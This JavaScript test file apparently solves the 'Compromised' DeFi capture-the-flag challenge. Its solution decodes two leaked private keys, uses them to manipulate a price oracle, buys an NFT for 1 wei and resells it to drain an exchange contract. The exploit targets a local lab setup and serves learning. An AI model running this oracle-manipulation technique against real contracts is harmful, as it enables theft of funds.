const { expect } = require('chai');
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        
        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ['DVNFT', 'DVNFT', 'DVNFT'],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        nftToken = (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Taking a look at the instructions provided for this challenge, and specially at the HTTP response, we can see that the body looks like ASCII chars in hex.
        // Converting the hex to ASCII, we get a non-sense message.
        // Base64 decoding the string (I tried this since its a really common encoding used on the web), we get two ETH private keys.
        // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        // Assuming (could check beforehand) they are from the oracle's trusted sources, we can get it to change the price as we wish, since we have 2/3 of the sources under our control.

        // Instantiate the two compromised trusted sources
        const source1 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider)
        const source2 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider)

        // Change the median price reported by the oracle to 1 wei
        await oracle.connect(source1).postPrice("DVNFT", 1)
        await oracle.connect(source2).postPrice("DVNFT", 1)

        // Buy an NFT (id=0, could also get it from the event in the tx receipt) for 1 wei
        await exchange.connect(player).buyOne({ value: 1 })

        // Change the price back to normal (+ 1, to completely drain the contract)
        await oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE + 1n)
        await oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE + 1n)

        // Sell the NFT and get all the ETH from the exchange
        await nftToken.connect(player).approve(exchange.address, 0)
        await exchange.connect(player).sellOne(0)

        // Change the price back to normal to pass the challenge
        await oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE)
        await oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE)
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);
        
        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice('DVNFT')
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
